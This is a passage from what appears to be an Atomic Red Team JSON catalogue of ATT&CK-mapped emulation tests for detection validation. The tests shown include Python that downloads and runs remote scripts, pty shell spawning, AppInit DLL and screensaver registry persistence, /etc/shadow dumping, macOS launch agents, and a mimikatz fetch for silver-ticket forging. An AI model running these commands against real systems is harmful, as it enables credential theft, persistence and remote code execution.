"payload_file_name": {"description": "Shell script file name downloaded from the script_url", "type": "string", "default": "T1059.006-payload"}, "executor": {"description": "Payload or script interpreter / executor", "type": "string", "default": "sh"}, "script_args": {"description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files", "type": "string", "default": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Requires Python\n", "prereq_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n", "get_prereq_command": "pip install requests    \n"}], "executor": {"command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' > #{python_script_name}\necho 'import os' >> #{python_script_name}\necho 'url = \"#{script_url}\"' >> #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >> #{python_script_name}\necho 'session = requests.session()' >> #{python_script_name}\necho 'source = session.get(url).content' >> #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' >> #{python_script_name}\necho 'fd.write(source)' >> #{python_script_name}\necho 'fd.close()' >> #{python_script_name}\necho 'os.system(malicious_command)' >> #{python_script_name}\n$which_python #{python_script_name}\n", "name": "sh", "cleanup_command": "rm #{python_script_name} #{payload_file_name}  \n"}}, {"name": "Execute Python via Python executables", "auto_generated_guid": "0b44d79b-570a-4b27-a31f-3bf2156e5eaa", "description": "Create Python file (.py) then compile to binary (.pyc) that downloads an external malicious script then executes locally using the supplied executor and arguments\n", "supported_platforms": ["linux"], "input_arguments": {"python_script_name": {"description": "Name of Python script name", "type": "path", "default": "T1059.006.py"}, "script_url": {"description": "URL hosting external malicious payload", "type": "string", "default": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"}, "payload_file_name": {"description": "Shell script file name downloaded from the script_url", "type": "string", "default": "T1059.006-payload"}, "executor": {"description": "Payload or script interpreter / executor", "type": "string", "default": "sh"}, "script_args": {"description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files", "type": "string", "default": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"}, "python_binary_name": {"description": "Name of Python file to be compiled", "type": "path", "default": "T1059.006.pyc"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Requires Python\n", "prereq_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n", "get_prereq_command": "pip install requests    \n"}], "executor": {"command": "which_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' > #{python_script_name}\necho 'import os' >> #{python_script_name}\necho 'url = \"#{script_url}\"' >> #{python_script_name}\necho 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >> #{python_script_name}\necho 'session = requests.session()' >> #{python_script_name}\necho 'source = session.get(url).content' >> #{python_script_name}\necho 'fd = open(\"#{payload_file_name}\", \"wb+\")' >> #{python_script_name}\necho 'fd.write(source)' >> #{python_script_name}\necho 'fd.close()' >> #{python_script_name}\necho 'os.system(malicious_command)' >> #{python_script_name}\n$which_python -c 'import py_compile; py_compile.compile(\"#{python_script_name}\", \"#{python_binary_name}\")'\n$which_python #{python_binary_name}\n", "name": "sh", "cleanup_command": "rm #{python_binary_name} #{python_script_name} #{payload_file_name}\n"}}, {"name": "Python pty module and spawn function used to spawn sh or bash", "auto_generated_guid": "161d694c-b543-4434-85c3-c3a433e33792", "description": "Uses the Python spawn function to spawn a sh shell followed by a bash shell. Per Volexity, this technique was observed in exploitation of Atlassian Confluence [CVE-2022-26134]. Reference: https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence\n", "supported_platforms": ["linux"], "dependencies": [{"description": "Verify if python is in the environment variable path and attempt to import requests library.\n", "prereq_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?          \n", "get_prereq_command": "pip install requests\n"}], "executor": {"command": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c \"import pty;pty.spawn('/bin/sh')\"\nexit\n$which_python -c \"import pty;pty.spawn('/bin/bash')\"\nexit", "name": "sh"}}]}, "T1546.010": {"name": "AppInit DLLs", "technique_id": "attack-pattern--cc89ecbd-3d33-4a41-bcca-001e702d18fd", "external_id": "T1546.010", "data_components": ["Windows Registry Key Modification", "OS API Execution", "Module Load", "Process Creation", "Command Execution"], "kill_chain_phases": ["privilege-escalation", "persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--e5d930e9-775a-40ad-9bdb-b941d8dfe86b"], "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017)\n\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)", "atomic_tests": [{"name": "Install AppInit Shim", "auto_generated_guid": "a58d9386-3080-4242-ab5f-454c16503d18", "description": "AppInit_DLLs is a mechanism that allows an arbitrary list of DLLs to be loaded into each user mode process on the system. Upon succesfully execution, \nyou will see the message \"The operation completed successfully.\" Each time the DLL is loaded, you will see a message box with a message of \"Install AppInit Shim DLL was called!\" appear.\nThis will happen regularly as your computer starts up various applications and may in fact drive you crazy. A reliable way to make the message box appear and verify the \nAppInit Dlls are loading is to start the notepad application. Be sure to run the cleanup commands afterwards so you don't keep getting message boxes showing up.\n\nNote: If secure boot is enabled, this technique will not work. https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls\n", "supported_platforms": ["windows"], "input_arguments": {"registry_file": {"description": "Windows Registry File", "type": "path", "default": "PathToAtomicsFolder\\T1546.010\\src\\T1546.010.reg"}, "registry_cleanup_file": {"description": "Windows Registry File", "type": "path", "default": "PathToAtomicsFolder\\T1546.010\\src\\T1546.010-cleanup.reg"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Reg files must exist on disk at specified locations (#{registry_file} and #{registry_cleanup_file})\n", "prereq_command": "if ((Test-Path \"#{registry_file}\") -and (Test-Path \"#{registry_cleanup_file}\")) {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory (split-path \"#{registry_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010.reg\" -OutFile \"#{registry_file}\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010-cleanup.reg\" -OutFile \"#{registry_cleanup_file}\"\n"}, {"description": "DLL's must exist in the C:\\Tools directory (T1546.010.dll and T1546.010x86.dll)\n", "prereq_command": "if ((Test-Path c:\\Tools\\T1546.010.dll) -and (Test-Path c:\\Tools\\T1546.010x86.dll)) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory C:\\Tools -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010.dll\" -OutFile C:\\Tools\\T1546.010.dll\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010x86.dll\" -OutFile C:\\Tools\\T1546.010x86.dll\n"}], "executor": {"command": "reg.exe import \"#{registry_file}\"\n", "cleanup_command": "reg.exe import \"#{registry_cleanup_file}\" >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}]}, "T1496": {"name": "Resource Hijacking", "technique_id": "attack-pattern--cd25c1b4-935c-4f0e-ba8d-552f28bc4783", "external_id": "T1496", "data_components": ["Command Execution", "Network Connection Creation", "Process Creation", "File Creation", "Network Traffic Flow", "Host Status"], "kill_chain_phases": ["impact"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems, which may impact system and/or hosted service availability. \n\nOne common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.(Citation: CloudSploit - Unused AWS Regions) Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs)\n\nAdditionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it\u2019s not competing for resources.(Citation: Trend Micro War of Crypto Miners)\n\nAdversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate [Network Denial of Service](https://attack.mitre.org/techniques/T1498) campaigns and/or to seed malicious torrents.(Citation: GoBotKR)", "atomic_tests": [{"name": "FreeBSD/macOS/Linux - Simulate CPU Load with Yes", "auto_generated_guid": "904a5a0e-fb02-490d-9f8d-0e256eb37549", "description": "This test simulates a high CPU load as you might observe during cryptojacking attacks.\nEnd the test by using CTRL/CMD+C to break.\n", "supported_platforms": ["linux", "macos"], "executor": {"command": "yes > /dev/null\n", "name": "sh"}}]}, "T1546.002": {"name": "Screensaver", "technique_id": "attack-pattern--ce4b7013-640e-48a9-b501-d0025a95f4bf", "external_id": "T1546.002", "data_components": ["Process Creation", "Command Execution", "Windows Registry Key Modification", "File Creation", "File Modification"], "kill_chain_phases": ["privilege-escalation", "persistence"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\\Windows\\System32\\</code>, and <code>C:\\Windows\\sysWOW64\\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.\n\nThe following screensaver settings are stored in the Registry (<code>HKCU\\Control Panel\\Desktop\\</code>) and could be manipulated to achieve persistence:\n\n* <code>SCRNSAVE.exe</code> - set to malicious PE path\n* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver\n* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock\n* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.(Citation: ESET Gazer Aug 2017)", "atomic_tests": [{"name": "Set Arbitrary Binary as Screensaver", "auto_generated_guid": "281201e7-de41-4dc9-b73d-f288938cbb64", "description": "This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.\n", "supported_platforms": ["windows"], "input_arguments": {"input_binary": {"description": "Executable binary to use in place of screensaver for persistence", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}, "reboot": {"description": "Set to non-zero value if you want the test to reboot the system so that changes take effect", "type": "integer", "default": 0}}, "executor": {"command": "reg export \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" %userprofile%\\backup.reg\ncopy #{input_binary} \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nif #{reboot} NEQ 0 shutdown /r /t 0\n", "cleanup_command": "reg import %userprofile%\\backup.reg\ndel %userprofile%\\backup.reg\ndel %SystemRoot%\\System32\\evilscreensaver.scr\n", "name": "command_prompt", "elevation_required": true}}]}, "T1003.008": {"name": "/etc/passwd and /etc/shadow", "technique_id": "attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4", "external_id": "T1003.008", "data_components": ["File Access", "Command Execution"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)\n\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:(Citation: nixCraft - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>\n", "atomic_tests": [{"name": "Access /etc/shadow (Local)", "auto_generated_guid": "3723ab77-c546-403c-8fb4-bb577033b235", "description": "/etc/shadow file is accessed in Linux environments\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "path", "default": "/tmp/T1003.008.txt"}}, "executor": {"command": "sudo cat /etc/shadow > #{output_file}\ncat #{output_file}\n", "cleanup_command": "rm -f #{output_file}\n", "name": "bash", "elevation_required": true}}, {"name": "Access /etc/master.passwd (Local)", "auto_generated_guid": "5076874f-a8e6-4077-8ace-9e5ab54114a5", "description": "/etc/master.passwd file is accessed in FreeBSD environments\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "path", "default": "/tmp/T1003.008.txt"}}, "executor": {"command": "sudo cat /etc/master.passwd > #{output_file}\ncat #{output_file}\n", "cleanup_command": "rm -f #{output_file}\n", "name": "sh", "elevation_required": true}}, {"name": "Access /etc/passwd (Local)", "auto_generated_guid": "60e860b6-8ae6-49db-ad07-5e73edd88f5d", "description": "/etc/passwd file is accessed in FreeBSD and Linux environments\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "path", "default": "/tmp/T1003.008.txt"}}, "executor": {"command": "cat /etc/passwd > #{output_file}\ncat #{output_file}\n", "cleanup_command": "rm -f #{output_file}\n", "name": "sh"}}, {"name": "Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat", "auto_generated_guid": "df1a55ae-019d-4120-bc35-94f4bc5c4b0a", "description": "Dump /etc/passwd, /etc/master.passwd and /etc/shadow using ed\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "path", "default": "/tmp/T1003.008.txt"}}, "executor": {"command": "echo -e \"e /etc/passwd\\n,p\\ne /etc/master.passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > #{output_file}\n", "cleanup_command": "rm -f #{output_file}\n", "name": "sh", "elevation_required": true}}, {"name": "Access /etc/{shadow,passwd,master.passwd} with shell builtins", "auto_generated_guid": "f5aa6543-6cb2-4fae-b9c2-b96e14721713", "description": "Dump /etc/passwd, /etc/master.passwd and /etc/shadow using sh builtins\n", "supported_platforms": ["linux"], "input_arguments": {"output_file": {"description": "Path where captured results will be placed", "type": "path", "default": "/tmp/T1003.008.txt"}}, "executor": {"command": "testcat(){ (while read line; do echo $line >> #{output_file}; done < $1) }\ntestcat /etc/passwd\ntestcat /etc/master.passwd\ntestcat /etc/shadow\n", "cleanup_command": "rm -f #{output_file}\n", "name": "sh", "elevation_required": true}}]}, "T1543.001": {"name": "Launch Agent", "technique_id": "attack-pattern--d10cbd34-42e3-45c0-84d2-535a09849584", "external_id": "T1543.001", "data_components": ["Service Modification", "Command Execution", "File Modification", "File Creation", "Service Creation"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--987988f0-cf86-4680-a875-2f6456ab2448"], "description": "Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware) Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time.(Citation: OSX.Dok Malware) Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.\n\n Launch Agents can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001) command.\n \nAdversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>.(Citation: Sofacy Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.(Citation: OSX Malware Detection)(Citation: OceanLotus for OS X) ", "atomic_tests": [{"name": "Launch Agent", "auto_generated_guid": "a5983dee-bf6c-4eaf-951c-dbc1a7b90900", "description": "Create a plist and execute it\n", "supported_platforms": ["macos"], "input_arguments": {"plist_filename": {"description": "filename", "type": "string", "default": "com.atomicredteam.plist"}, "path_malicious_plist": {"description": "Name of file to store in cron folder", "type": "string", "default": "$PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "The shared library must exist on disk at specified location (#{path_malicious_plist})\n", "prereq_command": "if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "echo \"The shared library doesn't exist. Check the path\"; exit 1;\n"}], "executor": {"name": "bash", "elevation_required": true, "command": "if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;\nsudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}\nsudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}\n", "cleanup_command": "sudo launchctl unload ~/Library/LaunchAgents/#{plist_filename}\nsudo rm ~/Library/LaunchAgents/#{plist_filename}\n"}}, {"name": "Event Monitor Daemon Persistence", "auto_generated_guid": "11979f23-9b9d-482a-9935-6fc9cd022c3e", "description": "This test adds persistence via a plist to execute via the macOS Event Monitor Daemon. \n", "supported_platforms": ["macos"], "input_arguments": {"script_location": {"description": "evil plist location", "type": "path", "default": "$PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist"}, "script_destination": {"description": "Path where to move the evil plist", "type": "path", "default": "/etc/emond.d/rules/atomicredteam_T1543_001.plist"}, "empty_file": {"description": "Random name of the empty file used to trigger emond service", "type": "string", "default": "randomflag"}}, "executor": {"name": "bash", "elevation_required": true, "command": "sudo cp #{script_location} #{script_destination}\nsudo touch /private/var/db/emondClients/#{empty_file}\n", "cleanup_command": "sudo rm #{script_destination}\nsudo rm /private/var/db/emondClients/#{empty_file}"}}]}, "T1059.003": {"name": "Windows Command Shell", "technique_id": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62", "external_id": "T1059.003", "data_components": ["Command Execution", "Process Creation"], "kill_chain_phases": ["execution"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db"], "description": "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.", "atomic_tests": [{"name": "Create and Execute Batch Script", "auto_generated_guid": "9e8894c0-50bd-4525-a96c-d4ac78ece388", "description": "Creates and executes a simple batch script. Upon execution, CMD will briefly launch to run the batch script then close again.\n", "supported_platforms": ["windows"], "input_arguments": {"command_to_execute": {"description": "Command to execute within script.", "type": "string", "default": "dir"}, "script_path": {"description": "Script path.", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1059.003_script.bat"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Batch file must exist on disk at specified location (#{script_path})\n", "prereq_command": "if (Test-Path \"#{script_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item \"#{script_path}\" -Force | Out-Null\nSet-Content -Path \"#{script_path}\" -Value \"#{command_to_execute}\"\n"}], "executor": {"command": "Start-Process \"#{script_path}\"\n", "cleanup_command": "Remove-Item \"#{script_path}\" -Force -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Writes text to a file and displays it.", "auto_generated_guid": "127b4afe-2346-4192-815c-69042bec570e", "description": "Writes text to a file and display the results. This test is intended to emulate the dropping of a malicious file to disk.\n", "supported_platforms": ["windows"], "input_arguments": {"file_contents_path": {"description": "Path to the file that the command prompt will drop.", "type": "path", "default": "%TEMP%\\test.bin"}, "message": {"description": "Message that will be written to disk and then displayed.", "type": "string", "default": "Hello from the Windows Command Prompt!"}}, "executor": {"command": "echo \"#{message}\" > \"#{file_contents_path}\" & type \"#{file_contents_path}\"\n", "cleanup_command": "del \"#{file_contents_path}\" >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Suspicious Execution via Windows Command Shell", "auto_generated_guid": "d0eb3597-a1b3-4d65-b33b-2cda8d397f20", "description": "Command line executed via suspicious invocation. Example is from the 2021 Threat Detection Report by Red Canary.\n", "supported_platforms": ["windows"], "input_arguments": {"output_file": {"description": "File to output to", "type": "string", "default": "hello.txt"}, "input_message": {"description": "Message to write to file", "type": "string", "default": "Hello, from CMD!"}}, "executor": {"command": "%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file} & type #{output_file}\n", "name": "command_prompt"}}, {"name": "Simulate BlackByte Ransomware Print Bombing", "auto_generated_guid": "6b2903ac-8f36-450d-9ad5-b220e8a2dcb9", "description": "This test attempts to open a file a specified number of times in Wordpad, then prints the contents. \nIt is designed to mimic BlackByte ransomware's print bombing technique, where tree.dll, which contains the ransom note, is opened in Wordpad 75 times and then printed. \nSee https://redcanary.com/blog/blackbyte-ransomware/. \n", "supported_platforms": ["windows"], "input_arguments": {"file_to_print": {"description": "File to be opened/printed by Wordpad.", "type": "string", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1059_003note.txt"}, "max_to_print": {"description": "The maximum number of Wordpad windows the test will open/print.", "type": "integer", "default": 75}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "File to print must exist on disk at specified location (#{file_to_print})\n", "prereq_command": "if (test-path \"#{file_to_print}\"){exit 0} else {exit 1}\n", "get_prereq_command": "new-item \"#{file_to_print}\" -value \"This file has been created by T1059.003 Test 4\" -Force | Out-Null\n"}], "executor": {"command": "cmd /c \"for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}\" | out-null\n", "cleanup_command": "stop-process -name wordpad -force -erroraction silentlycontinue\n", "name": "powershell"}}, {"name": "Command Prompt read contents from CMD file and execute", "auto_generated_guid": "df81db1b-066c-4802-9bc8-b6d030c3ba8e", "description": "Simulate Raspberry Robin using the \"standard-in\" command prompt feature cmd `/R <` to read and execute a file via cmd.exe\nSee https://redcanary.com/blog/raspberry-robin/. \n", "supported_platforms": ["windows"], "input_arguments": {"input_file": {"description": "CMD file that is read by Command Prompt and execute, which launches calc.exe", "type": "path", "default": "PathToAtomicsFolder\\T1059.003\\src\\t1059.003_cmd.cmd"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "CMD file must exist on disk at specified location (#{input_file})\n", "prereq_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{input_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1059.003/src/t1059.003_cmd.cmd\" -OutFile \"#{input_file}\"\n"}], "executor": {"command": "cmd /r cmd<\"#{input_file}\"\n", "name": "command_prompt", "elevation_required": false}}, {"name": "Command prompt writing script to file then executes it", "auto_generated_guid": "00682c9f-7df4-4df8-950b-6dcaaa3ad9af", "description": "    Simulate DarkGate malware's second stage by writing a VBscript to disk directly from the command prompt then executing it.\n    The script will execute 'whoami' then exit.", "supported_platforms": ["windows"], "input_arguments": {"script_path": {"description": "Path in which the script will be written.", "type": "path", "default": "%TEMP%\\"}, "script_name": {"description": "Script name (without the extension)", "type": "string", "default": "AtomicTest"}}, "executor": {"command": " c:\\windows\\system32\\cmd.exe /c cd /d #{script_path} & echo Set objShell = CreateObject(\"WScript.Shell\"):Set objExec = objShell.Exec(\"whoami\"):Set objExec = Nothing:Set objShell = Nothing > #{script_name}.vbs & #{script_name}.vbs", "cleanup_command": "del \"#{script_name}.vbs\" >nul 2>&1", "name": "command_prompt", "elevation_required": true}}]}, "T1558.002": {"name": "Silver Ticket", "technique_id": "attack-pattern--d273434a-448e-4598-8e14-607f4a0d5e27", "external_id": "T1558.002", "data_components": ["Logon Session Metadata"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--feff9142-e8c2-46f4-842b-bd6fb3d41157"], "description": "Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.(Citation: ADSecurity Silver Tickets)\n\nSilver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.(Citation: ADSecurity Detecting Forged Tickets)\n\nPassword hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).", "atomic_tests": [{"name": "Crafting Active Directory silver tickets with mimikatz", "auto_generated_guid": "385e59aa-113e-4711-84d9-f637aef01f2c", "description": "Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n", "supported_platforms": ["windows"], "input_arguments": {"domain_sid": {"description": "SID of the targeted domain, if you keep default it will automatically get the current domain SID", "type": "string", "default": "S-1-5-21-DEFAULT"}, "domain": {"description": "Targeted Active Directory domain FQDN", "type": "string", "default": "%userdnsdomain%"}, "account": {"description": "Account to impersonate", "type": "string", "default": "silverticketfakeuser"}, "target": {"description": "System you want to target (Default will be logon server)", "type": "string", "default": "%logonserver:\\\\=%"}, "service_aes256_key": {"description": "AES256 key (you will need to set to match your service key for your target)", "type": "string", "default": "b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9"}, "mimikatz_path": {"description": "Mimikatz windows executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n", "prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Remove-Item $env:TEMP\\silver.bat 